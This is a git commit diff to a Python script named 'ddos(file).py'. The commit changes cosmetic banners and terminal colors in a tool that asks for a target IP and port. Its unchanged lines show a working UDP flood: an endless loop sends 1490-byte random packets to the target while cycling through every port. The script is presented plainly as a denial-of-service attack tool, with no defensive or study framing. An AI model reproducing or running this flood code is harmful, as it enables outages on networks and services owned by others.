67bdfe500a7d0e45479366def4bb7db246b1ba1d
JustAHacker <116762253+I-can-ddos@users.noreply.github.com>
2023-07-12 02:38:55 +0200

    ddos(file).py

--- ddos(file).py
+++ ddos(file).py
@@ -17,23 +17,16 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 
-os.system("clear")
-os.system("figlet DDos Attack")
 print(Fore.GREEN + "Author   : nobodyy78364")
-print("You Tube : IN CONTRUCTION")
-print("github   : IN CONTRUCTION")
-print("Facebook : IN CONTRUCTION")
 
-ip = input(Fore.YELLOW + "IP Target: ")
+ip = input(Fore.LIGHTYELLOW_EX + "IP Target: ")
 port = int(input("Port: "))
 
-os.system("clear")
-os.system("figlet Attack Starting")
 print(Fore.LIGHTRED_EX + "[===============] 0% ")
 time.sleep(1)
-print("[====================] 25%")
+print(Fore.GREEN + "[====================] 25%")
 time.sleep(1)
-print(Fore.LIGHTHGREEN_EX"[=========================] 50%")
+print(Fore.LIGHTGREEN_EX + "[=========================] 50%")
 time.sleep(1)
 print(Fore.LIGHTBLUE_EX + "[==============================] 100%")
 time.sleep(2)
@@ -43,6 +36,6 @@ while True:
     sock.sendto(bytes, (ip, port))
     sent += 1
     port += 1
-    print(Fore.LIGHTMAGENTA_EX + "Sent {} packet to {} through port: {}".format(sent, ip, port))
+    print(Fore.LIGHTMAGENTA_EX + "Sent {} packet{} through port: {}".format(sent, ip, port))
     if port == 65534:
         port = 1
